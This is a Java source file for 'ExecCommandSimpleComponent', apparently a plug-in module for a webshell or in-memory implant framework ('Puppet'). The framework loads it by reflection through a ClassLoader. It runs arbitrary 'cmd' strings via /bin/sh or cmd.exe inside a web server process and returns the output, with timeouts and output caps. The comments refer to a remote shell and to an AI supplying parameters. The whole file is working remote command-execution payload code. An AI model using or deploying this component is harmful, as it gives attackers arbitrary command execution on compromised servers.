package org.leo.core.component;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.util.HashMap;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 一次性命令执行组件
 * <p>
 * 与 {@code ExecCommandComponent} 的交互式 shell 不同，本组件为无状态一次性执行：
 * 启动子进程 → 等待退出 → 返回完整输出 + 退出码，适用于无 session 状态依赖的命令
 * （如 whoami、id、ls、ps、cat、grep ...）。
 * <p>
 * 入参：
 * <ul>
 *   <li>{@code cmd}（String 或 byte[]）— 要执行的命令字符串</li>
 *   <li>{@code timeout}（Integer，可选）— 超时秒数；缺省或 &lt;=0 时使用 {@link #DEFAULT_TIMEOUT_MS}</li>
 * </ul>
 * 出参：
 * <ul>
 *   <li>{@code data}（byte[]）— stdout + stderr 合并输出（UTF-8，最多 4 MB）</li>
 *   <li>{@code exitCode}（Integer）— 进程退出码</li>
 *   <li>{@code timedOut}（Boolean）— true 表示触发超时被强制终止</li>
 *   <li>{@code truncated}（Boolean）— true 表示输出超过 4 MB、返回内容已截断</li>
 *   <li>{@code code}（Integer）— 200 成功 / 400 参数错误 / 500 执行异常</li>
 * </ul>
 * <p>
 * 遵循 COMPONENT_GUIDE.md：Java 1.6 语法，无 lambda/内部类/try-with-resources/diamond。
 *
 * @author LeoSpring
 * @version 1.2
 */
public class ExecCommandSimpleComponent implements Runnable {

    private static final int  BUFFER_SIZE        = 4096;
    private static final int  MAX_OUTPUT_BYTES   = 4 * 1024 * 1024; // 4 MB
    private static final long DEFAULT_TIMEOUT_MS = 30000L;           // 30s
    private static final long MAX_TIMEOUT_MS     = 300000L;          // 5min 上限，防止入参滥用
    private static final AtomicInteger THREAD_SEQUENCE = new AtomicInteger();

    private HashMap<String, Object> params;
    private HashMap<String, Object> results;

    // ── Worker thread 通信字段（volatile 保证跨线程可见性） ─────────────────────
    private volatile boolean workerMode     = false;
    private volatile boolean workerDone     = false;
    private volatile byte[]  workerOutput;
    private volatile int     workerExitCode = 0;
    private volatile String  workerError;
    private volatile boolean workerCancelled;
    private volatile boolean workerTruncated;
    /** 由 worker 创建后写入；invoke() 触发超时时调用 destroy() 强制结束。 */
    private volatile Process workerProcess;

    // workerMode=true 时由主线程填写，worker 线程只读
    private String execCmd;

    // ── Component 入口（由框架通过 ClassLoader 反射调用） ──────────────────────

    public void run() {
        // 工作线程入口：执行真正的系统命令
        if (workerMode) {
            execInWorker();
            return;
        }

        // Puppet 框架入口：获取参数、调用业务逻辑、回写结果
        java.lang.reflect.InvocationHandler h =
                (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
        try {
            params  = (java.util.HashMap) h.invoke(null, null, null);
            results = new java.util.HashMap();
            invoke();
        } catch (Throwable t) {
            if (results == null) results = new java.util.HashMap();
            results.put("code", Integer.valueOf(500));
            results.put("msg", t.getMessage() != null ? t.getMessage() : t.getClass().getName());
        }
        if (results != null) {
            try { h.invoke(null, null, new Object[]{results}); } catch (Throwable ignored) {}
        }
    }

    // ── Worker 线程：在独立线程中执行系统命令，防止阻塞 HTTP 请求线程 ──────────

    private void execInWorker() {
        try {
            if (workerCancelled) return;

            String[] command;
            if (isWindows()) {
                command = new String[]{"cmd.exe", "/c", execCmd};
            } else {
                command = new String[]{"/bin/sh", "-c", execCmd};
            }

            ProcessBuilder pb = new ProcessBuilder(command);
            pb.redirectErrorStream(true); // stderr 合并到 stdout

            Process process = pb.start();
            workerProcess = process; // 让主线程在超时后能 destroy

            // 超时可能发生在 pb.start() 之前；进程创建后再次检查，避免漏杀。
            if (workerCancelled) {
                try { process.destroy(); } catch (Exception ignored) {}
                try { process.getInputStream().close(); } catch (Exception ignored) {}
                return;
            }

            // 关闭子进程 stdin，防止某些 shell 等待输入而阻塞
            try { process.getOutputStream().close(); } catch (Exception ignored) {}

            ByteArrayOutputStream output = new ByteArrayOutputStream();
            InputStream is = process.getInputStream();
            byte[] buffer = new byte[BUFFER_SIZE];
            int read;
            int total = 0;
            try {
                while ((read = is.read(buffer)) != -1) {
                    int remaining = MAX_OUTPUT_BYTES - total;
                    if (remaining <= 0) {
                        workerTruncated = true;
                        continue; // 继续排空管道，避免子进程阻塞
                    }
                    int toWrite = read <= remaining ? read : remaining;
                    output.write(buffer, 0, toWrite);
                    total += toWrite;
                    if (toWrite < read) workerTruncated = true;
                }
            } finally {
                try { is.close(); } catch (Exception ignored) {}
            }

            try {
                workerExitCode = process.waitFor();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            } finally {
                process.destroy();
            }

            workerOutput = output.toByteArray();

        } catch (Throwable t) {
            workerError = t.getMessage() != null ? t.getMessage() : t.getClass().getName();
        } finally {
            workerMode = false;
            workerDone = true;
        }
    }

    // ── 业务逻辑 ──────────────────────────────────────────────────────────────

    public void invoke() throws Exception {
        String cmd = getStringParam("cmd");
        if (cmd == null || cmd.trim().length() == 0) {
            results.put("code", Integer.valueOf(400));
            results.put("msg", "cmd parameter is required");
            return;
        }

        long timeoutMs = parseTimeoutMs();

        // 准备 worker 线程状态
        execCmd       = cmd;
        workerError   = null;
        workerOutput  = null;
        workerProcess = null;
        workerDone    = false;
        workerCancelled = false;
        workerTruncated = false;
        workerMode    = true;  // volatile write：建立 happens-before，execCmd 对 worker 可见

        Thread worker = new Thread(this,
                getClass().getSimpleName() + "-" + THREAD_SEQUENCE.incrementAndGet());
        worker.setDaemon(true);
        worker.start();

        // 等待 worker 完成，最多 timeoutMs
        long deadline = System.currentTimeMillis() + timeoutMs;
        while (!workerDone && System.currentTimeMillis() < deadline) {
            try { Thread.sleep(50L); } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                break;
            }
        }

        boolean timedOut = !workerDone;
        if (timedOut) {
            // 强制终止子进程；worker 的 read/waitFor 会因 EOF/InterruptedException 退出，
            // 然后给它一小段时间把已经读到的输出写回 workerOutput。
            workerCancelled = true;
            Process p = workerProcess;
            if (p != null) {
                try { p.destroy(); } catch (Exception ignored) {}
                try { p.getInputStream().close(); } catch (Exception ignored) {}
            }
            long graceDeadline = System.currentTimeMillis() + 500L;
            while (!workerDone && System.currentTimeMillis() < graceDeadline) {
                try { Thread.sleep(20L); } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    break;
                }
            }
            if (!workerDone) worker.interrupt();
        }

        if (timedOut) {
            results.put("code",     Integer.valueOf(200));
            results.put("data",     workerOutput != null ? workerOutput : new byte[0]);
            results.put("exitCode", Integer.valueOf(-1));
            results.put("timedOut", Boolean.TRUE);
            results.put("truncated", Boolean.valueOf(workerTruncated));
            results.put("msg",      "command timed out after " + (timeoutMs / 1000L) + "s");
            return;
        }

        if (workerError != null) {
            results.put("code", Integer.valueOf(500));
            results.put("msg", workerError);
            return;
        }

        results.put("code",     Integer.valueOf(200));
        results.put("data",     workerOutput != null ? workerOutput : new byte[0]);
        results.put("exitCode", Integer.valueOf(workerExitCode));
        results.put("timedOut", Boolean.FALSE);
        results.put("truncated", Boolean.valueOf(workerTruncated));
    }

    /**
     * 解析 timeout 入参（秒）。缺省、非数字、&lt;=0 时回落到 {@link #DEFAULT_TIMEOUT_MS}；
     * 超过 {@link #MAX_TIMEOUT_MS} 时截断到上限，避免 AI 误传超大值占住远端 shell 资源。
     */
    private long parseTimeoutMs() {
        Object raw = params.get("timeout");
        if (raw == null) return DEFAULT_TIMEOUT_MS;
        long seconds;
        if (raw instanceof Number) {
            seconds = ((Number) raw).longValue();
        } else {
            try {
                seconds = Long.parseLong(raw.toString().trim());
            } catch (NumberFormatException e) {
                return DEFAULT_TIMEOUT_MS;
            }
        }
        if (seconds <= 0) return DEFAULT_TIMEOUT_MS;
        if (seconds > MAX_TIMEOUT_MS / 1000L) return MAX_TIMEOUT_MS;
        long ms = seconds * 1000L;
        if (ms > MAX_TIMEOUT_MS) return MAX_TIMEOUT_MS;
        return ms;
    }

    // ── 工具方法 ──────────────────────────────────────────────────────────────

    private boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase().contains("windows");
    }

    private String getStringParam(String key) {
        if (key == null) return null;
        Object value = params.get(key);
        if (value == null) return null;
        if (value instanceof String) return (String) value;
        if (value instanceof byte[]) {
            try {
                return new String((byte[]) value, "UTF-8");
            } catch (UnsupportedEncodingException e) {
                return new String((byte[]) value);
            }
        }
        return String.valueOf(value);
    }
}
